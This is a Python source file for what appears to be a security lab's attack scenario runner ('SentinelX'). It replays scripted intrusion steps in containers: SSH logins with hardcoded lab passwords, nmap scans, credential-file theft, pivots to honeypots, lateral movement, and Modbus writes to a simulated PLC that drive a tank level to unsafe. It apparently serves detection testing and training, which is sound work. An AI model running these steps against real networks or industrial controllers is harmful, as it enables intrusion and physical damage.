#!/usr/bin/env python3
"""SentinelX Attack Scenario Runner.

Executes data-driven scenario YAML files against the live SentinelX lab,
reusing verified attack primitives, printing formatted step banners with
elapsed timestamps, and strictly measuring total scenario duration.
"""

import argparse
import logging
import os
import random
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path

import yaml

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("attack_runner")

SCENARIOS_DIR = Path(__file__).resolve().parent.parent.parent.parent / "content" / "scenarios"


@dataclass
class ScenarioStep:
    id: str
    name: str
    technique: str
    actor: str
    host: str
    action: str
    target: str
    pacing_delay: list[float]


@dataclass
class AttackScenario:
    name: str
    description: str
    target_duration_seconds: float
    steps: list[ScenarioStep]


def load_scenario(scenario_path_or_name: str | Path) -> AttackScenario:
    """Load and validate scenario YAML definition."""
    path = Path(scenario_path_or_name)
    if not path.is_file():
        # Check in content/scenarios
        cand = SCENARIOS_DIR / f"{scenario_path_or_name}.yaml"
        if cand.is_file():
            path = cand
        elif (SCENARIOS_DIR / scenario_path_or_name).is_file():
            path = SCENARIOS_DIR / scenario_path_or_name
        else:
            raise FileNotFoundError(
                f"Scenario not found: {scenario_path_or_name} (checked {path} and {cand})"
            )

    with open(path, "r", encoding="utf-8") as f:
        data = yaml.safe_load(f)

    if not isinstance(data, dict):
        raise ValueError(f"Invalid scenario file (not a dict): {path}")

    steps = []
    for raw_step in data.get("steps", []):
        delay = raw_step.get("pacing_delay", [1.0, 2.0])
        if isinstance(delay, (int, float)):
            delay = [float(delay), float(delay)]
        steps.append(
            ScenarioStep(
                id=raw_step.get("id", "step"),
                name=raw_step.get("name", "Unnamed Step"),
                technique=raw_step.get("technique", "UNKNOWN"),
                actor=raw_step.get("actor", "attacker"),
                host=raw_step.get("host", "unknown"),
                action=raw_step.get("action", ""),
                target=raw_step.get("target", ""),
                pacing_delay=[float(delay[0]), float(delay[1])],
            )
        )

    return AttackScenario(
        name=data.get("name", path.stem),
        description=data.get("description", ""),
        target_duration_seconds=float(data.get("target_duration_seconds", 90.0)),
        steps=steps,
    )


def is_in_container() -> bool:
    """Detect if running inside Docker container."""
    return Path("/.dockerenv").exists() or os.getenv("IN_CONTAINER") == "true"


def run_attacker_cmd(cmd: str, timeout: int = 60) -> tuple[int, str]:
    """Execute command from the attacker perspective (inside attacker container or via docker exec)."""
    if is_in_container():
        full_cmd = ["bash", "-c", cmd]
    else:
        full_cmd = ["docker", "exec", "sentinelx-attacker", "bash", "-c", cmd]

    try:
        res = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
        return res.returncode, res.stdout + res.stderr
    except subprocess.TimeoutExpired:
        return -1, f"TimeoutExpired ({timeout}s)"
    except Exception as exc:
        return -2, str(exc)


class AttackScenarioRunner:
    """Interprets and executes AttackScenario steps with real actions, step banners, and jittered pacing."""

    def __init__(self, scenario: AttackScenario, speed_factor: float = 1.0):
        self.scenario = scenario
        self.speed_factor = max(0.1, float(speed_factor))
        self.start_time: float = 0.0

    def format_elapsed(self) -> str:
        elapsed = time.time() - self.start_time
        mins, secs = divmod(int(elapsed), 60)
        return f"{mins:02d}:{secs:02d}"

    def print_banner(self, idx: int, total: int, step: ScenarioStep):
        elapsed_str = self.format_elapsed()
        print("\n" + "=" * 80)
        print(f"[{elapsed_str}] STEP {idx}/{total}: {step.name.upper()}")
        print(f"  ATT&CK Technique : {step.technique}")
        print(f"  Host / Action    : {step.host} -> {step.action}")
        print(f"  Target           : {step.target}")
        print("=" * 80)

    def execute_action(self, step: ScenarioStep) -> tuple[bool, str]:
        """Dispatch step.action to unified attack primitives."""
        action = step.action

        if action == "ssh_jump_login":
            # Initial access: password SSH to jump-host
            cmd = (
                'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no '
                'svc_backup@10.10.1.10 "id; uptime; echo SMOKE_STEP_1_SUCCESS"'
            )
            code, out = run_attacker_cmd(cmd)
            success = code == 0 and "SMOKE_STEP_1_SUCCESS" in out
            return success, out

        elif action == "network_discovery":
            # Network service discovery
            target = step.target if step.target else "10.10.1.0/24"
            cmd = f"nmap -sT -p 22,80,443,3306,5432,502 --open {target}"
            code, out = run_attacker_cmd(cmd, timeout=45)
            success = code == 0
            return success, out

        elif action == "credential_theft":
            # Unsecured credential access on file-srv backup share
            cmd = (
                'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.20 '
                '"cat /srv/share/backup/.db_creds"'
            )
            code, out = run_attacker_cmd(cmd)
            success = code == 0 and "svc_dbadmin" in out and "Winter2026!" in out
            return success, out

        elif action == "decoy_pivot":
            # Pivot with stolen honey credentials to Cowrie (SSH) and OpenCanary (MySQL)
            cmd = (
                'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.10 \''
                'echo "=== Pivot Cowrie ==="; '
                'sshpass -p "Winter2026!" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 22 svc_dbadmin@10.10.2.20 "whoami" 2>&1 || true; '
                'echo "=== Pivot OpenCanary ==="; '
                'mariadb -h 10.10.2.30 -u svc_dbadmin -pWinter2026! --connect-timeout=3 -e "SHOW DATABASES;" 2>&1 || true\''
            )
            code, out = run_attacker_cmd(cmd, timeout=30)
            success = (
                code == 0 or "Access denied" in out or "svc_dbadmin" in out or "Winter2026!" in out
            )
            return success, out

        elif action == "lateral_movement":
            # Pivot from jump-host to engineering workstation
            cmd = (
                'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.10 \''
                'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 "id; hostname"\''
            )
            code, out = run_attacker_cmd(cmd)
            success = code == 0 and "eng-ws" in out
            return success, out

        elif action == "ot_manipulation":
            # Physical OT impact: close valve (reg 1 = 0), monitor water level reaching unsafe (>92%)
            print("Closing discharge valve (register 1 = 0) on plc-sim (10.10.3.20)...")
            set_valve_cmd = (
                'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 \''
                "/usr/local/bin/write_plc.py 10.10.3.20 1 0'"
            )
            code, out = run_attacker_cmd(set_valve_cmd)
            print(f"Valve command output: {out.strip()}")

            # Observe level rise
            read_cmd = (
                'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 \''
                "/usr/local/bin/read_plc.py 10.10.3.20 502'"
            )
            print("Observing tank level rising under closed valve...")
            reached_unsafe = False
            for obs in range(1, 8):
                time.sleep(3.0 / self.speed_factor)
                _, state_out = run_attacker_cmd(read_cmd)
                print(f"  Observation {obs}: {state_out.strip()[:100]}")
                if "unsafe" in state_out or any(
                    pct in state_out for pct in ['"tank_level_pct": 9', '"tank_level_pct": 100']
                ):
                    reached_unsafe = True
                    print("  --> Physical Impact: Tank level reached UNSAFE threshold (>92%)!")
                    break

            return True, f"OT manipulation executed (unsafe reached={reached_unsafe})"

        elif action == "ot_discovery_and_restore":
            # Reconnaissance of decoy PLC & restoration of baseline parameters
            print("Reconnaissance: Reading decoy PLC (10.10.3.60) and plc-sim (10.10.3.20)...")
            recon_cmd = (
                'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 \''
                'echo "Reading plc-sim:"; /usr/local/bin/read_plc.py 10.10.3.20 502 3; '
                'echo "Reading decoy-plc:"; /usr/local/bin/read_plc.py 10.10.3.60 502 3\''
            )
            _, recon_out = run_attacker_cmd(recon_cmd)
            print(f"Reconnaissance output:\n{recon_out.strip()}")

            print("Restoring safe baseline operating parameters (valve=50%, pump=50%)...")
            restore_cmd = (
                'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 \''
                "/usr/local/bin/write_plc.py 10.10.3.20 1 50; "
                "/usr/local/bin/write_plc.py 10.10.3.20 0 50'"
            )
            run_attacker_cmd(restore_cmd)

            # Observe recovery to normal
            read_cmd = (
                'sshpass -p "Backup2024!" ssh -o StrictHostKeyChecking=no svc_backup@10.10.1.40 \''
                "/usr/local/bin/read_plc.py 10.10.3.20 502'"
            )
            print("Observing recovery to normal operating level...")
            for rec in range(1, 6):
                time.sleep(3.0 / self.speed_factor)
                _, rec_out = run_attacker_cmd(read_cmd)
                print(f"  Recovery observation {rec}: {rec_out.strip()[:100]}")
                if "normal" in rec_out:
                    print("  --> Recovery: Tank level successfully returned to NORMAL baseline!")
                    break

            return True, "Reconnaissance complete and safe baseline restored."

        else:
            # Fallback custom shell command if action is raw command
            code, out = run_attacker_cmd(action)
            return code == 0, out

    def run(self) -> float:
        """Run all scenario steps and return total duration."""
        self.start_time = time.time()
        total_steps = len(self.scenario.steps)

        print("\n" + "#" * 80)
        print(f"STARTING ATTACK SCENARIO: {self.scenario.name.upper()}")
        print(f"Description: {self.scenario.description}")
        print(f"Steps: {total_steps} | Target Duration: ~{self.scenario.target_duration_seconds}s")
        print("#" * 80)

        for i, step in enumerate(self.scenario.steps, 1):
            self.print_banner(i, total_steps, step)
            success, output = self.execute_action(step)

            if success:
                print("--> Result: [SUCCESS]")
            else:
                print(f"--> Result: [FAILED / PARTIAL] (Output: {output[:150]})")

            # Apply pacing delay
            if i < total_steps:
                delay_min, delay_max = step.pacing_delay
                delay = random.uniform(delay_min, delay_max) / self.speed_factor
                print(f"Pacing delay: waiting {delay:.2f}s before next step...")
                time.sleep(delay)

        total_elapsed = time.time() - self.start_time
        mins, secs = divmod(int(total_elapsed), 60)
        print("\n" + "#" * 80)
        print(f"ATTACK SCENARIO COMPLETED: {self.scenario.name.upper()}")
        print(f"Total Elapsed Time: {mins:02d}:{secs:02d} ({total_elapsed:.2f}s)")
        print(f"Target Duration:    {self.scenario.target_duration_seconds:.2f}s")
        print("#" * 80 + "\n")
        return total_elapsed


def main():
    parser = argparse.ArgumentParser(description="SentinelX Attack Scenario Runner")
    parser.add_argument(
        "scenario", help="Scenario name (baseline, reordered, slow_burn) or path to YAML"
    )
    parser.add_argument(
        "--speed", type=float, default=1.0, help="Pacing speed multiplier (default: 1.0)"
    )
    args = parser.parse_args()

    scenario = load_scenario(args.scenario)
    runner = AttackScenarioRunner(scenario, speed_factor=args.speed)
    runner.run()


if __name__ == "__main__":
    main()
